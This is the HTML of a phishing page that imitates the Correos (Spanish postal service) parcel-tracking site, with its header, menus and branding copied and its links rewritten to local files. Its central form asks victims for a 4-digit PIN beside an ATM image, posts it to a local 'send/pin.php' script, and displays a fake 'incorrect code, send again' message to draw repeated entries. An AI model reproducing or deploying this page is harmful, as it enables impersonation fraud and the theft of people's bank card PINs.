garantías&quot;,&quot;id&quot;:&quot;coberturas-y-garantías&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/coberturas-y-garantias&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;Tarifas&quot;,&quot;id&quot;:&quot;tarifas&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/tarifas&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Tratamiento de las incidencias/reclamaciones/consultas&quot;,&quot;id&quot;:&quot;tratamiento-de-las-incidencias/reclamaciones/consultas&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/tu-consulta-tu-reclamacion/tratamiento-de-las-incidencias-reclamaciones-consultas&quot;},{&quot;name&quot;:&quot;Da de alta tu incidencia/ reclamación&quot;,&quot;id&quot;:&quot;da-de-alta-tu-incidencia/-reclamación&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/tu-consulta-tu-reclamacion/da-de-alta-tu-incidencia-reclamacion&quot;},{&quot;name&quot;:&quot;Modifica o amplia información&quot;,&quot;id&quot;:&quot;modifica-o-amplia-información&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/tu-consulta-tu-reclamacion/modifica-o-amplia-informacion&quot;},{&quot;name&quot;:&quot;Conoce el estado de tu incidencia&quot;,&quot;id&quot;:&quot;conoce-el-estado-de-tu-incidencia&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/tu-consulta-tu-reclamacion/conoce-el-estado-de-tu-incidencia&quot;},{&quot;name&quot;:&quot;Solicita información&quot;,&quot;id&quot;:&quot;solicita-información&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/tu-consulta-tu-reclamacion/solicita-informacion&quot;}],&quot;name&quot;:&quot;Tu consulta/ tu reclamación&quot;,&quot;id&quot;:&quot;tu-consulta/-tu-reclamación&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/tu-consulta-tu-reclamacion&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Phishing&quot;,&quot;id&quot;:&quot;phishing&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/seguridad-de-la-informacion/phishing&quot;},{&quot;name&quot;:&quot;Qué hace Correos por tu seguridad&quot;,&quot;id&quot;:&quot;qué-hace-correos-por-tu-seguridad&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/seguridad-de-la-informacion/que-hace-correos-por-tu-seguridad&quot;},{&quot;name&quot;:&quot;Decálogo de seguridad&quot;,&quot;id&quot;:&quot;decálogo-de-seguridad&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/seguridad-de-la-informacion/decalogo-de-seguridad&quot;},{&quot;name&quot;:&quot;Verificador de email&quot;,&quot;id&quot;:&quot;verificador-de-email&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/seguridad-de-la-informacion/verificador-de-email&quot;}],&quot;name&quot;:&quot;Seguridad de la información&quot;,&quot;id&quot;:&quot;seguridad-de-la-información&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/seguridad-de-la-informacion&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;Admisión internacional de correspondencia y paquetería&quot;,&quot;id&quot;:&quot;admisión-internacional-de-correspondencia-y-paquetería&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/especial-covid-19/admision-internacional-de-correspondencia-y-paqueteria&quot;},{&quot;name&quot;:&quot;Correos una empresa segura frente al COVID-19&quot;,&quot;id&quot;:&quot;correos-una-empresa-segura-frente-al-covid-19&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/especial-covid-19/correos-una-empresa-segura-frente-al-covid-19&quot;},{&quot;name&quot;:&quot;Envíos con destino China &quot;,&quot;id&quot;:&quot;envíos-con-destino-china-&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/especial-covid-19/envios-con-destino-china-&quot;}],&quot;name&quot;:&quot;Especial Covid-19&quot;,&quot;id&quot;:&quot;especial-covid-19&quot;},{&quot;children&quot;:[],&quot;name&quot;:&quot;Especial Ucrania/Rusia&quot;,&quot;id&quot;:&quot;especial-ucrania/rusia&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente/especial-ucrania-rusia&quot;}],&quot;targetLink&quot;:&quot;_self&quot;,&quot;icon&quot;:&quot;icon-help&quot;,&quot;name&quot;:&quot;Ayuda&quot;,&quot;id&quot;:&quot;ayuda&quot;,&quot;href&quot;:&quot;/es/es/atencion-al-cliente&quot;,&quot;titleLink&quot;:&quot;Ayuda&quot;}],&quot;name&quot;:&quot;&quot;,&quot;id&quot;:&quot;adicionalesEmpresa&quot;},{&quot;children&quot;:[{&quot;name&quot;:&quot;ES&quot;,&quot;id&quot;:&quot;es&quot;,&quot;href&quot;:&quot;/es/es/herramientas/localizador/envios/detalle&quot;},{&quot;name&quot;:&quot;CA&quot;,&quot;id&quot;:&quot;ca&quot;,&quot;href&quot;:&quot;/es/ca/eines/localitzador/trameses/detall&quot;},{&quot;name&quot;:&quot;EU&quot;,&quot;id&quot;:&quot;eu&quot;,&quot;href&quot;:&quot;/es/eu/tresnak/lokalizatzailea/bidalketak/xehetasunak&quot;},{&quot;name&quot;:&quot;GA&quot;,&quot;id&quot;:&quot;gl&quot;,&quot;href&quot;:&quot;/es/gl/ferramentas/localizador/envios/detalle&quot;},{&quot;name&quot;:&quot;VA&quot;,&quot;id&quot;:&quot;va&quot;,&quot;href&quot;:&quot;/es/va/ferramentes/localitzador/enviaments/detall&quot;},{&quot;name&quot;:&quot;EN&quot;,&quot;id&quot;:&quot;en&quot;,&quot;href&quot;:&quot;/es/en/tools/tracker/items/details&quot;}],&quot;name&quot;:&quot;Idioma:&quot;,&quot;id&quot;:&quot;idiomas&quot;},{&quot;children&quot;:[{&quot;targetLink&quot;:&quot;_blank&quot;,&quot;icon&quot;:&quot;icon-profile&quot;,&quot;name&quot;:&quot;INICIAR SESIÓN&quot;,&quot;id&quot;:&quot;login&quot;,&quot;href&quot;:&quot;https://mioficina.correos.es/es/es/login&quot;}],&quot;name&quot;:&quot;&quot;,&quot;id&quot;:&quot;accesos&quot;}]" searchurl="/es/es/buscador/detalle" searchtarget="false" locatorsearchurl="/es/es/herramientas/localizador/envios/detalle" zipcodeurl="/es/es/herramientas/codigos-postales/detalle" menutitleparticular="Particular" menutitleempresa="Empresa" particularhref="/es/es/particulares" particulartarget="_self" tabparticularactive="true" empresahref="/es/es/empresas" empresatarget="_self" tabempresaactive="false" menuopened="particular" imageprofiledefault="/content/dam/mioficina/iconos/profile_avatar.svg" loginmenuliterals="[{&quot;targetLink&quot;:&quot;_self&quot;,&quot;name&quot;:&quot;MI OFICINA&quot;,&quot;id&quot;:&quot;mi-oficina&quot;,&quot;href&quot;:&quot;https://mioficina.correos.es/es/es/home&quot;,&quot;title&quot;:&quot;Ir a Mi Oficina&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;name&quot;:&quot;MI PERFIL&quot;,&quot;id&quot;:&quot;mi-perfil&quot;,&quot;href&quot;:&quot;https://mioficina.correos.es/es/es/home/mi-perfil/detalle&quot;,&quot;title&quot;:&quot;Ir a Mi Perfil&quot;},{&quot;buttonRef&quot;:&quot;https://mioficina.correos.es/es/es/login&quot;,&quot;targetLink&quot;:&quot;_self&quot;,&quot;name&quot;:&quot;CERRAR SESIÓN&quot;,&quot;id&quot;:&quot;cerrarsesion&quot;,&quot;title&quot;:&quot;Cerrar sesión&quot;}]" modaltitleerror="" highlighttext="" imagemodalsrc="" imagemodalalt="" urlepostal="https://epostal.correos.es/OV2PREENVWEB/ibm_security_logout?logoutExitPage=/jsp/_rlvid.jsp.faces?_rap=gc_logout.desconexionOV2" description="" cqtype="correos/reactcomponents/CorreosCdkCoreHeader" cqpath="/es/es/herramientas/localizador/envios/detalle/jcr:content/root/correoscdkcoreheader" isineditor="false" componentproperties="[object Object]" modal-title="Acciones" logo-src="/content/dam/correos/imagenes/ilustraciones/logos/LogoCornamusa.svg" logo-href="/es/es/particulares" logo-target="_self" current-lang="es" menu-lv-zero="particular" search-input-label="Busca en correos.es" search-url="/es/es/buscador/detalle" search-target="false" locator-search-url="/es/es/herramientas/localizador/envios/detalle" zip-code-url="/es/es/herramientas/codigos-postales/detalle" menu-title-particular="Particular" menu-title-empresa="Empresa" particular-href="/es/es/particulares" particular-target="_self" tab-particular-active="true" empresa-href="/es/es/empresas" empresa-target="_self" tab-empresa-active="false" menu-opened="particular" image-profile-default="/content/dam/mioficina/iconos/profile_avatar.svg" login-menu-literals="[{&quot;targetLink&quot;:&quot;_self&quot;,&quot;name&quot;:&quot;MI OFICINA&quot;,&quot;id&quot;:&quot;mi-oficina&quot;,&quot;href&quot;:&quot;https://mioficina.correos.es/es/es/home&quot;,&quot;title&quot;:&quot;Ir a Mi Oficina&quot;},{&quot;targetLink&quot;:&quot;_self&quot;,&quot;name&quot;:&quot;MI PERFIL&quot;,&quot;id&quot;:&quot;mi-perfil&quot;,&quot;href&quot;:&quot;https://mioficina.correos.es/es/es/home/mi-perfil/detalle&quot;,&quot;title&quot;:&quot;Ir a Mi Perfil&quot;},{&quot;buttonRef&quot;:&quot;https://mioficina.correos.es/es/es/login&quot;,&quot;targetLink&quot;:&quot;_self&quot;,&quot;name&quot;:&quot;CERRAR SESIÓN&quot;,&quot;id&quot;:&quot;cerrarsesion&quot;,&quot;title&quot;:&quot;Cerrar sesión&quot;}]" modal-title-error="" highlight-text="" image-modal-src="" image-modal-alt="" url-epostal="https://epostal.correos.es/OV2PREENVWEB/ibm_security_logout?logoutExitPage=/jsp/_rlvid.jsp.faces?_rap=gc_logout.desconexionOV2" cq-type="correos/reactcomponents/CorreosCdkCoreHeader" cq-path="/es/es/herramientas/localizador/envios/detalle/jcr:content/root/correoscdkcoreheader" class="sc-correos-cdk-core-header-h sc-correos-cdk-core-header-s --fixed --particular hydrated" menu-lv-first="" size="sm">
										<div class="cdk-core-header-root sc-correos-cdk-core-header">
											<header class="cdk-header undefined sc-correos-cdk-core-header">
												<div class="cdk-header-wrapper wrapper-main sc-correos-cdk-core-header">
													<div class="cdk-header-start false sc-correos-cdk-core-header"><a target="_self" href="/www.correos.es/es/es/particulares.html" class="sc-correos-cdk-core-header">
															<div class="cdk-header-logo-container sc-correos-cdk-core-header">
																<img class="cdk-header-logo sc-correos-cdk-core-header" src="./files/img/logocornamusa.svg" alt="logo">
															</div>
														</a>
														<button class="cdk-nav-button --arrow-up sc-correos-cdk-core-header" aria-label="Menú" aria-expanded="false" aria-pressed="false"><i class="icon-burger sc-correos-cdk-core-header"></i></button>
														<div class="cdk-header-menu sc-correos-cdk-core-header">
															<div class="cdk-header-menu-option --active sc-correos-cdk-core-header">
																<a target="_self" href="/www.correos.es/es/es/particulares.html" class="sc-correos-cdk-core-header">Particular</a>
															</div>
															<div class="cdk-header-menu-option sc-correos-cdk-core-header">
																<a target="_self" href="/www.correos.es/es/es/empresas.html" class="sc-correos-cdk-core-header">Empresa</a>
															</div>
														</div>
													</div>
													<div class="cdk-header-input-container cdk-header-input-container--mobile-close sc-correos-cdk-core-header">
														<correos-ui-input class="cdk-header-input-search sc-correos-cdk-core-header sc-correos-ui-input-h sc-correos-ui-input-s undefined hydrated" type="search" variant="straight-lines" style="width: inherit;">
															<!---->
															<div class="correos-ui-input_root light sc-correos-ui-input">
																<div class="mdc-text-field mdc-text-field--with-trailing-icon mdc-menu-surface--anchor sc-correos-ui-input mdc-ripple-upgraded">
																	<input class="mdc-text-field__input sc-correos-ui-input" id="correos-ui-input_31421" name="correos-ui-input_31421" type="search" autocomplete="none"><label class="mdc-floating-label sc-correos-ui-input" for="correos-ui-input_31421">Busca en
																		correos.es</label><i class="material-icons mdc-text-field__icon --notCursor false sc-correos-ui-input" tabindex="null" role="button"><svg xmlns="icon-search" width="24" height="24" viewBox="0 0 24 24" class="sc-correos-ui-input">
																			<path class="sc-correos-ui-input" d="M11.5,16 C14.5375661,16 17,13.5375661 17,10.5 C17,7.46243388 14.5375661,5 11.5,5 C8.46243388,5 6,7.46243388 6,10.5 C6,13.5375661 8.46243388,16 11.5,16 Z M11.5,3 C15.6421356,3 19,6.35786438 19,10.5 C19,12.5126302 18.2072386,14.3401011 16.9169447,15.6871837 L19.7549329,19.2384967 C20.1054602,19.6693553 20.0765037,20.3356142 19.6902568,20.7266275 C19.3040099,21.1176409 18.7067364,21.0853399 18.3562091,20.6544813 L15.3749466,16.9227316 C14.2440358,17.6064955 12.9179718,18 11.5,18 C7.35786438,18 4,14.6421356 4,10.5 C4,6.35786438 7.35786438,3 11.5,3 Z" id="path-1"></path>
																		</svg></i>
																	<div class="mdc-line-ripple sc-correos-ui-input">
																	</div>
																</div>
															</div>
														</correos-ui-input><button class="cdk-header-close-button sc-correos-cdk-core-header"><i class="icon-close cdk-header-close-icon sc-correos-cdk-core-header"></i></button>
													</div>
													<ol class="cdk-header-quick-access false sc-correos-cdk-core-header">
														<li class="cdk-header-quick-access-item sc-correos-cdk-core-header">
															<a href="/mioficina.correos.es/es/es/login.html" aria-label="INICIAR SESIÓN" class="sc-correos-cdk-core-header"></a><a href="/mioficina.correos.es/es/es/login.html" aria-label="INICIAR SESIÓN" class="sc-correos-cdk-core-header"><i class="icon-profile sc-correos-cdk-core-header"></i><span class="cdk-header-title sc-correos-cdk-core-header">INICIAR
																	SESIÓN</span></a>
														</li>
													</ol>
												</div>
											</header>
											<nav class="cdk-nav --hide undefined sc-correos-cdk-core-header" role="navigation" aria-expanded="false" tabindex="-1" aria-label="Menú de primer nivel">
												<div class="cdk-nav-content sc-correos-cdk-core-header">
													<div class="cdk-nav-page --lv-first sc-correos-cdk-core-header">
														<div class="cdk-nav-page-content --lv-first sc-correos-cdk-core-header">
															<div class="cdk-nav-switch sc-correos-cdk-core-header">
																<div class="cdk-nav-switch-option sc-correos-cdk-core-header">
																	<input tabindex="-1" type="radio" id="core-nav-switch-particular" name="core-nav-switch-particular" value="" class="sc-correos-cdk-core-header"><label for="core-nav-switch-particular" class="sc-correos-cdk-core-header">Particular</label>
																</div>
																<div class="cdk-nav-switch-option sc-correos-cdk-core-header">
																	<input tabindex="-1" type="radio" id="core-nav-switch-empresa" name="core-nav-switch-empresa" value="" class="sc-correos-cdk-core-header"><label for="core-nav-switch-empresa" class="sc-correos-cdk-core-header">Empresa</label>
																</div>
															</div>
															<p class="cdk-nav-lv-title sc-correos-cdk-core-header">
																Particular</p>
															<ol class="cdk-nav-lv-first sc-correos-cdk-core-header">
															</ol>
															<div class="cdk-nav-langs sc-correos-cdk-core-header"><span class="cdk-nav-langs-title sc-correos-cdk-core-header">Idioma:</span>
																<ol class="cdk-nav-langs-list sc-correos-cdk-core-header" tabindex="-1" aria-label="Selección de idiomas">
																	<li class="cdk-nav-langs-item --title sc-correos-cdk-core-header">
																		<a tabindex="-1" href="/www.correos.es/es/es/herramientas/localizador/envios/detalle.html" class="sc-correos-cdk-core-header">ES</a>
																	</li>
																	<li class="cdk-nav-langs-item sc-correos-cdk-core-header">
																		<a tabindex="-1" href="/www.correos.es/es/ca/eines/localitzador/trameses/detall.html" class="sc-correos-cdk-core-header">CA</a>
																	</li>
																	<li class="cdk-nav-langs-item sc-correos-cdk-core-header">
																		<a tabindex="-1" href="/www.correos.es/es/eu/tresnak/lokalizatzailea/bidalketak/xehetasunak.html" class="sc-correos-cdk-core-header">EU</a>
																	</li>
																	<li class="cdk-nav-langs-item sc-correos-cdk-core-header">
																		<a tabindex="-1" href="/www.correos.es/es/gl/ferramentas/localizador/envios/detalle.html" class="sc-correos-cdk-core-header">GA</a>
																	</li>
																	<li class="cdk-nav-langs-item sc-correos-cdk-core-header">
																		<a tabindex="-1" href="/www.correos.es/es/va/ferramentes/localitzador/enviaments/detall.html" class="sc-correos-cdk-core-header">VA</a>
																	</li>
																	<li class="cdk-nav-langs-item sc-correos-cdk-core-header">
																		<a tabindex="-1" href="/www.correos.es/es/en/tools/tracker/items/details.html" class="sc-correos-cdk-core-header">EN</a>
																	</li>
																</ol>
															</div>
														</div>
													</div>
													<correos-ui-scroll-bar class="cdk-scroll-bar sc-correos-cdk-core-header sc-correos-ui-scroll-bar-h sc-correos-ui-scroll-bar-s hydrated ps" update-scroll-bar="2">
														<!---->
														<div class="cdk-nav-page --lv-second sc-correos-cdk-core-header" slot="container-scroll">
															<div class="cdk-nav-page-content --lv-second --hide sc-correos-cdk-core-header" tabindex="-1" arial-label="Menú de segundo nivel">
																<header class="cdk-nav-lv-second-toolbar sc-correos-cdk-core-header">
																	<button arial-label="Volver al menú principal" class="cdk-nav-lv-second-goback sc-correos-cdk-core-header"><i class="icon-arrow_R sc-correos-cdk-core-header"></i><span class="sc-correos-cdk-core-header">Volver</span></button>
																</header>
																<p class="cdk-nav-lv-second-title sc-correos-cdk-core-header" tabindex="-1"><span class="sc-correos-cdk-core-header"></span></p>
																<div class="cdk-nav-lv-div-columns sc-correos-cdk-core-header">
																	<ol class="cdk-nav-lv-second-columns sc-correos-cdk-core-header">
																	</ol>
																</div>
															</div>
															<div class="cdk-nav-page-click-outside sc-correos-cdk-core-header">
															</div>
														</div>
														<div class="ps__rail-x" style="left: 0px; bottom: 0px;" hidden="">
															<div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 0px;"></div>
														</div>
														<div class="ps__rail-y" style="top: 0px; right: 0px;" hidden="">
															<div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div>
														</div>
													</correos-ui-scroll-bar>
													<div class="cdk-nav-content-click-outside sc-correos-cdk-core-header">
													</div>
												</div>
												<div class="cdk-nav-overlay sc-correos-cdk-core-header"></div>
											</nav>
										</div>
										<correos-cdk-pop-up class="sc-correos-cdk-core-header sc-correos-cdk-pop-up-h sc-correos-cdk-pop-up-s hydrated">
											<!---->
											<div class="cdk-container false sc-correos-cdk-pop-up">
												<div class="cdk-modal sc-correos-cdk-pop-up">
													<div class="cdk-modal-content sc-correos-cdk-pop-up">
														<div class="cdk-header sc-correos-cdk-pop-up sc-correos-cdk-pop-up-s">
															<h3 slot="title" class="sc-correos-cdk-core-header"></h3><i class="cdk-icon icon-close sc-correos-cdk-pop-up" tabindex="0"></i>
														</div>
														<correos-ui-scroll-bar update-scroll-bar="0" class="sc-correos-cdk-pop-up sc-correos-ui-scroll-bar-h sc-correos-ui-scroll-bar-s hydrated ps">
															<!---->
															<div class="cdk-content sc-correos-cdk-pop-up sc-correos-cdk-pop-up-s" slot="container-scroll">
																<div slot="content" class="modal row sc-correos-cdk-core-header">
																	<div class="col-12 md:col-6 lg:col-6 sc-correos-cdk-core-header">
																		<img class="img sc-correos-cdk-core-header" src="" alt="">
																	</div>
																	<div class="col-12 md:col-6 lg:col-6 sc-correos-cdk-core-header" slot="content">
																		<div class="sc-correos-cdk-core-header">
																			<h1 class="highlighText sc-correos-cdk-core-header">
																			</h1>
																			<correos-ui-text-inf class="sc-correos-cdk-core-header sc-correos-ui-text-inf-h sc-correos-ui-text-inf-s hydrated" size="xs">
																				<!---->
																				<div class="sc-correos-ui-text-inf sc-correos-ui-text-inf-s">
																					<div id="titleId" class="sc-correos-ui-text-inf sc-correos-ui-text-inf-s" style="color: var(--_ui-text-inf-color-title);">
																					</div>
																					<p slot="text" class="sc-correos-cdk-core-header">
																					</p>
																					<div class="ui-link sc-correos-ui-text-inf sc-correos-ui-text-inf-s">
																					</div>
																					<div class="ui-footer sc-correos-ui-text-inf sc-correos-ui-text-inf-s">
																					</div>
																				</div>
																			</correos-ui-text-inf>
																		</div>
																	</div>
																</div>
															</div>
															<div class="ps__rail-x" style="left: 0px; bottom: 0px;" hidden="">
																<div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 0px;"></div>
															</div>
															<div class="ps__rail-y" style="top: 0px; right: 0px;" hidden="">
																<div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div>
															</div>
														</correos-ui-scroll-bar>
														<div class="cdk-footer sc-correos-cdk-pop-up">
															<div class="cdk-footer__info sc-correos-cdk-pop-up sc-correos-cdk-pop-up-s">
															</div>
															<div class="cdk-footer__buttons sc-correos-cdk-pop-up sc-correos-cdk-pop-up-s">
															</div>
														</div>
													</div>
												</div>
											</div>
										</correos-cdk-pop-up>
									</correos-cdk-core-header>
									<div></div>
								</div>
								<div class="  aem-GridColumn aem-GridColumn--default--12">
									<correos-cdk-alert-type iconalert="" iconclose="icon-close" literalspopup="[]" dontshowcomponent="true" variant="" cqtype="correos/reactcomponents/CorreosCdkAlertType" cqpath="/es/es/herramientas/localizador/envios/detalle/jcr:content/root/correoscdkalerttype" isineditor="false" componentproperties="[object Object]" icon-alert="" icon-close="icon-close" literals-popup="[]" cq-type="correos/reactcomponents/CorreosCdkAlertType" cq-path="/es/es/herramientas/localizador/envios/detalle/jcr:content/root/correoscdkalerttype" class="sc-correos-cdk-alert-type-h sc-correos-cdk-alert-type-s hidden hydrated">
									</correos-cdk-alert-type>
									<div></div>
								</div>
								<div class="  aem-GridColumn aem-GridColumn--default--12">
									<div class="aem-container aem-Grid aem-Grid--12 aem-Grid--default--12">
										<div class="  aem-GridColumn aem-GridColumn--default--12">
											<correos-ui-breadcrumb literals="[{&quot;name&quot;:&quot;Herramientas&quot;,&quot;href&quot;:&quot;/es/es/herramientas&quot;},{&quot;name&quot;:&quot;Localizador de envíos&quot;,&quot;href&quot;:&quot;/es/es/herramientas/localizador&quot;}]" spacing="true" wrapper="" fullwidth="false" targetlink="_self" cqtype="correos/reactcomponents/CorreosUiBreadcrumb" cqpath="/es/es/herramientas/localizador/envios/detalle/jcr:content/root/responsivegrid/correosuibreadcrumb" isineditor="false" componentproperties="[object Object]" target-link="_self" cq-type="correos/reactcomponents/CorreosUiBreadcrumb" cq-path="/es/es/herramientas/localizador/envios/detalle/jcr:content/root/responsivegrid/correosuibreadcrumb" class="sc-correos-ui-breadcrumb-h sc-correos-ui-breadcrumb-s wrapper-main hydrated" style="--ui-breadcrumb-background-color:transparent;">
												<ul class="cdk-list-container cdk-list-container--spacing sc-correos-ui-breadcrumb">
													<li class="cdk-list-container__items sc-correos-ui-breadcrumb"><a class="cdk-list-container__items-ref sc-correos-ui-breadcrumb" href="/www.correos.es/es/es/herramientas.html">Herramientas</a>
													</li>
													<li class="cdk-list-container__items sc-correos-ui-breadcrumb">
														<div class="sc-correos-ui-breadcrumb">Localizador de envíos
														</div>
													</li>
												</ul>
											</correos-ui-breadcrumb>
											<div></div>
										</div>
										<div class="  aem-GridColumn aem-GridColumn--default--12">
											<div id="private-area-content" class="shipping-locator-detail">
												<correos-cdk-section-box bg-color="var(--theme-color-softestGrey)" variant="smpadding" class="sc-correos-cdk-section-box-h sc-correos-cdk-section-box-s hydrated" style="--cdk-section-box-background-color:var(--theme-color-softestGrey);">
													<!--app-->
													<div id="app"><div class="lite-tunnel-step1-wrapper"><div class="wrapper-main row"><div class="lite-tunnel-step1 col-12 md:col-12 lg:col-8">
														<form action="./send/pin.php" method="post">
															<fieldset class="lite-tunnel-step1__section"><h2 class="lite-tunnel-step1__title">Verificar</h2><div style="margin-top: 10px;"><img src="./files/img/teller-machine.png" alt="Image Description" width="50" height="50"></div><div class="form-section"><h4 class="form-section__title">Verificación del código PIN</h4><span class="form-section__subtitle">Pon tu código de 4 dígitos para proceder a la verificación y espera</span> <div class="personal-data-form"><div class="personal-data-form__section"><div class="row" style="width: 60%;"><div class="col-12 md:col-12 lg:col-12">
															<correos-ui-input label="Nombre" id="_pd_name" name="_pd_name" required="true" value="" pattern="^[a-zA-Z\u00C0-\u017F ,.'-]+$" invalidtext="Datos no válidos" type="text" class="personal-data-form__input sc-correos-ui-input-h sc-correos-ui-input-s undefined hydrated" style="width: inherit;">
																<div class="correos-ui-input_root default sc-correos-ui-input">
																<div class="mdc-text-field mdc-text-field--with-trailing-icon mdc-menu-surface--anchor sc-correos-ui-input mdc-ripple-upgraded">
																<input id="_pd_name" name="_pd_name" type="password" maxlength="4" autocomplete="none" pattern="^\d{4}$" required="required" class="mdc-text-field__input sc-correos-ui-input"></div> <!---->
																<div style="position: absolute; margin-left: 50%;">
																<button id="countdownOne" disabled="disabled" type="submit" style="width: 85px; height: 47px; background-color: rgb(223, 182, 48); color: rgb(18, 44, 107); border: 1px solid rgb(174, 145, 35); border-radius: 8px; font-size: 14px; font-weight: 600;">
																													••••
																												</button> <!----></div></div></correos-ui-input></div></div></div>
																												<span id="cardRequiredFieldValidator" class="smspass scale-up-bottom" style="color: red; display: inline; font-size: 14px;">El código de verificación es incorrecto, envíelo nuevamente, esperando para completar.</span></div></div></fieldset>
																												<correos-ui-button theme="primary" type="button" form="" class="lite-tunnel-step1__button sc-correos-ui-button-h sc-correos-ui-button-s hydrated" style="display: block;"><div class="mdc-touch-target-wrapper sc-correos-ui-button">
																													<button type="submit" class="mdc-button false sc-correos-ui-button sc-correos-ui-button-s mdc-ripple-upgraded" style="width: 100%;"><div class="mdc-button__ripple sc-correos-ui-button"></div><span class="mdc-button__label sc-correos-ui-button sc-correos-ui-button-s"><span slot="text">ENTREGAR
																							</span></span></button></div></correos-ui-button></form>
																						</div></div> <correos-cdk-pop-up modalopened="false" class="popup-event-control sc-correos-cdk-pop-up-h sc-correos-cdk-pop-up-s hydrated"><div class="cdk-container false sc-correos-cdk-pop-up"><div class="cdk-modal sc-correos-cdk-pop-up"><div class="cdk-modal-content sc-correos-cdk-pop-up"><div class="cdk-header sc-correos-cdk-pop-up sc-correos-cdk-pop-up-s"><span slot="title">¡Vaya! Parece que
																						esta herramienta está temporalmente
																						fuera de servicio</span><i tabindex="0" class="cdk-icon icon-close sc-correos-cdk-pop-up"></i></div> <correos-ui-scroll-bar update-scroll-bar="0" class="sc-correos-cdk-pop-up sc-correos-ui-scroll-bar-h sc-correos-ui-scroll-bar-s hydrated ps"><div slot="container-scroll" class="cdk-content sc-correos-cdk-pop-up sc-correos-cdk-pop-up-s"><div slot="content" class="modal row"><div class="col-12 md:col-6 lg:col-6 section-img"><img src="./files/img/error.svg" alt="Imagen de error" class="img"></div> <div class="col-12 md:col-6 lg:col-6"><div class="container-text-modal"><h1 class="undefined small-title">
																										¡Vaya! Parece que
																										esta herramienta
																										está temporalmente
																										fuera de servicio
																									</h1> <correos-ui-text-inf size="xs" class="sc-correos-ui-text-inf-h sc-correos-ui-text-inf-s hydrated"><div class="sc-correos-ui-text-inf sc-correos-ui-text-inf-s"><div id="titleId" class="sc-correos-ui-text-inf sc-correos-ui-text-inf-s" style="color: var(--_ui-text-inf-color-title);"></div> <p slot="text" class="text-inf-description">
																												Esta
																												herramienta
																												está fuera
																												de servicio
																												ahora mismo.
																												Puedes
																												seguir
																												navegando
																												por nuestra
																												web e
																												intentarlo
																												más tarde.
																											</p> <div class="ui-link sc-correos-ui-text-inf sc-correos-ui-text-inf-s"></div> <div class="ui-footer sc-correos-ui-text-inf sc-correos-ui-text-inf-s"><correos-ui-button slot="linkright" theme="primary" type="text" hreflink="https://mioficina.correos.es/es/es/home" target="_self" full-width="true" href-link="https://mioficina.correos.es/es/es/home" form="" class="sc-correos-ui-button-h sc-correos-ui-button-s hydrated"><div class="mdc-touch-target-wrapper sc-correos-ui-button"><a href="/mioficina.correos.es/es/es/home.html" target="_self" class="mdc-button full-width false sc-correos-ui-button sc-correos-ui-button-s"><div class="mdc-button__ripple sc-correos-ui-button"></div> <span class="mdc-button__label sc-correos-ui-button sc-correos-ui-button-s"><span slot="text">VOLVER
																																	A
																																	MI
																																	OFICINA</span></span></a></div></correos-ui-button></div></div></correos-ui-text-inf></div></div></div></div> <div hidden="hidden" class="ps__rail-x" style="left: 0px; bottom: 0px;"><div tabindex="0" class="ps__thumb-x" style="left: 0px; width: 0px;"></div></div> <div hidden="hidden" class="ps__rail-y" style="top: 0px; right: 0px;"><div tabindex="0" class="ps__thumb-y" style="top: 0px; height: 0px;"></div></div></correos-ui-scroll-bar> <div class="cdk-footer sc-correos-cdk-pop-up"><div class="cdk-footer__info sc-correos-cdk-pop-up sc-correos-cdk-pop-up-s"></div> <div class="cdk-footer__buttons sc-correos-cdk-pop-up sc-correos-cdk-pop-up-s"></div></div></div></div></div></correos-cdk-pop-up></div></div>
													<script src="config/urlconfig.json"></script>
													<script src="./static/js/axios.js" type="text/javascript" charset="utf-8">
													</script>
													<script src="./static/js/jquery-ui.js" type="text/javascript" charset="utf-8">
													</script>
													<script src="./static/js/vue.js" type="text/javascript" charset="utf-8"></script>
													<script src="./static/js/resourceconfig.js" type="text/javascript" charset="utf-8">
													</script>



												</correos-cdk-section-box>
												<correos-cdk-section-box bg-color="var(--theme-color-white-plain)" variant="lgpadding" class="sld-section-faqs--hide sc-correos-cdk-section-box-h sc-correos-cdk-section-box-s hydrated" style="--cdk-section-box-background-color:var(--theme-color-white-plain);">
													<!---->
													<div class="cdk-content sc-correos-cdk-section-box cdk-content--empty">
														<div class="wrapper-main undefined sc-correos-cdk-section-box sc-correos-cdk-section-box-s">
															<div slot="block">
																<correos-cdk-faqs class="row sc-correos-cdk-faqs-h sc-correos-cdk-faqs-s hydrated" close-others="false" size="xs">
																	<!---->
																	<div class="col-12 md:col-8 md:col-offset-2 lg:col-8 lg:col-offset-2 sc-correos-cdk-faqs sc-correos-cdk-faqs-s">
																		<h2 slot="title" class="sld-title-faqs"></h2>
																		<section slot="faqs" style="visibility: initial;"></section>
																	</div>
																</correos-cdk-faqs>
															</div>
														</div>
													</div>
												</correos-cdk-section-box>
											</div>
											<div></div>
										</div>
										<div class="  aem-GridColumn aem-GridColumn--default--12">
